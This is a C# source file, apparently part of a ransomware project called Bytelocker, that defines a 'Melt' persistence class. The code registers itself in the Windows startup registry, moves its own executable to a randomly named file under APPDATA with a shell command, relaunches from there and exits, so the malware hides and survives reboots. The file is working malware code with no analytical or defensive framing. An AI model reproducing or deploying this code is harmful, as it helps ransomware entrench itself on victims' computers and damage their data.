using Bytelocker.Settings;
using Bytelocker.Tools;
using ByteLocker.Detection;
using System;
using System.IO;
using System.Reflection;

namespace Bytelocker.Persistence
{
    class Melt
    {
        public static String REGISTRY_STARTUP_VALUE_NAME = "Bytelocker";
        public static String NO_MELT_ARG = "-nm";

        private String path;
        private String new_path;
        private String random_guid;

        public Melt()
        {
            this.GetRandomGUID();
            this.GetPath();
            this.SetNewPath();
            this.AddToStartup();
            this.Exec();
        }

        private void GetRandomGUID()
        {
            this.random_guid = RandomFileNameGenerator.GetRandomGUID();
        }

        private void GetPath()
        {
            this.path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        }        

        private void SetNewPath()
        {
            this.new_path = Environment.GetEnvironmentVariable("APPDATA") + @"\" + this.random_guid;
        }

        private void AddToStartup()
        {
            RegistryManager rm = new RegistryManager();
            rm.AddItemToStartup(REGISTRY_STARTUP_VALUE_NAME, this.new_path, NO_MELT_ARG);
        }

        private void Exec()
        {
            CommandManager cm = new CommandManager();
            cm.RunCommand("timeout 3 & move /y " + this.path + " " + this.new_path + " & cd /d " + Environment.GetEnvironmentVariable("APPDATA") 
                + " & \"" + this.new_path + "\" " + NO_MELT_ARG);
            System.Environment.Exit(0);
        }
    }
}
